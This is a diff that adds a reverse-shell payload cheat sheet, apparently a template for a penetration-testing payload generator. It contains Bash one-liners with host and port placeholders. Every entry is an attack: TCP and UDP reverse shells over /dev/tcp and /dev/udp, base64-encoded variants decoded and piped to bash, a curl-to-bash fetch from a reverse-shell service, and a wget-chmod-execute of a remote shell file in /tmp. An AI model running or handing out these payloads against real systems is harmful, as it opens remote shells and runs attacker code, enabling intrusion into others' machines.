@@ -1,0 +1,24 @@
+# Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash
+
+# desc: Bash
+curl http://reverse-shell.sh/1.1.1.1:3000 | bash  # 这个存疑
+
+# desc: Bash TCP
+bash -i >& /dev/tcp/#{LHOST}/#{LPORT} 0>&1
+
+# desc: Bash UDP
+sh -i >& /dev/udp/#{LHOST}/#{LPORT} 0>&1 #UDP
+0<&196;exec 196<>/dev/tcp/#{LHOST}/#{LPORT}; sh <&196 >&196 2>&196
+
+# desc: Symbol Safe Shell
+bash -c 'bash -i >& /dev/tcp/#{LHOST}/#{LPORT} 0>&1'
+
+# desc: Symbol Encode Safe Shell
+echo "bash -c 'bash -i >& /dev/tcp/#{LHOST}/#{LPORT} 0>&1'" | base64 -w0
+
+# desc: Symbol Decode Safe Shell
+echo #{base64} | base64 -d | bash 2>/dev/null
+@base64.desc(run Encode Safe Shell)
+
+# desc: Create in file and Execute
+wget http://#{LHOST}/#{shell_file} -P /tmp; chmod +x /tmp/#{shell_file}; /tmp/#{shell_file}
